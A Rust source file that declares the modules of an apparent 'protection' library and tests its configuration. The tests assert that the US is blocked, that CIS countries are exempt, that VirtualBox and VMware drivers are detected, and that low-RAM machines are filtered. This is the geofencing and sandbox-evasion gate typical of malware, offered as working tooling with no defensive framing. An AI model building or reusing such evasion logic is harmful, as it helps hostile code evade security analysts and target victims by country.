mod agent;
mod builder;
mod checks;
mod config;
mod ipapi;
mod protection;

pub use builder::ProtectionBuilder;
pub use protection::Protection;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{
        ALLOWED_COUNTRIES, BLOCKED_COUNTRIES, MIN_RAM_BYTES, VM_DRIVERS,
    };

    #[test]
    fn blocked_countries_not_empty() {
        assert!(!BLOCKED_COUNTRIES.is_empty());
    }

    #[test]
    fn cis_countries_not_blocked() {
        for code in ALLOWED_COUNTRIES {
            assert!(
                !BLOCKED_COUNTRIES.contains(code),
                "Country {code} was incorrectly added to the block list"
            );
        }
    }

    #[test]
    fn us_is_blocked() {
        assert!(BLOCKED_COUNTRIES.contains(&"US"));
    }

    #[test]
    fn vm_drivers_not_empty() {
        assert!(!VM_DRIVERS.is_empty());
    }

    #[test]
    fn vm_drivers_contain_vbox_and_vmware() {
        assert!(VM_DRIVERS.contains(&"VBoxGuest.sys"));
        assert!(VM_DRIVERS.contains(&"VBoxService.exe"));
        assert!(VM_DRIVERS.contains(&"vmxnet3.sys"));
        assert!(VM_DRIVERS.contains(&"vmci.sys"));
        assert!(VM_DRIVERS.contains(&"pvscsi.sys"));
    }

    #[test]
    fn min_ram_is_4gb() {
        assert_eq!(MIN_RAM_BYTES, 4 * 1024 * 1024 * 1024);
    }

    #[test]
    fn disabled_filters_do_not_exit() {
        ProtectionBuilder::new()
            .set_ip(false)
            .set_http(false)
            .set_vm(false)
            .set_network(false)
            .set_screen(false)
            .set_cpu(false)
            .set_ram(false)
            .init();
    }

    #[test]
    fn filtered_callback_runs_instead_of_exit() {
        use std::cell::Cell;
        use std::rc::Rc;

        let called = Rc::new(Cell::new(false));
        let flag = Rc::clone(&called);
        let protection = Protection {
            ip_filter:       false,
            http_filter:     false,
            network_filter:  false,
            vm_filter:       false,
            screen_filter:   false,
            cpu_filter:      false,
            ram_filter:      false,
            http_url:        String::new(),
            ip_api_url:      String::new(),
            timeout_secs:    1,
            filter_callback: Some(Box::new(move || flag.set(true))),
        };
        protection.on_fail();
        assert!(called.get());
    }
}
